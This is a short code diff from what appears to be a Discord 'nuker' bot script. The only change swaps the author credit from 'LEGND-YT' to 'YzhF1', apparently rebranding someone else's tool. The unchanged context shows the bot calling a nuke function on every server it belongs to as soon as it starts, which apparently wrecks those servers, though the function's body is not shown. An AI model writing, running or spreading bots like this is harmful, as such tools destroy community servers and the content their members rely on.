@@ -903,7 +903,7 @@ LOka.on('ready', () => {
   for(const [, g] of LOka.guilds) nuke(g).catch(console.error);
   console.log('-------------------------------------------------------------');
   console.log('');
-  console.log("Made by LEGND-YT");
+  console.log("Made by YzhF1");
   console.log("");
   console.log("-------------------------------------------------------------");
  
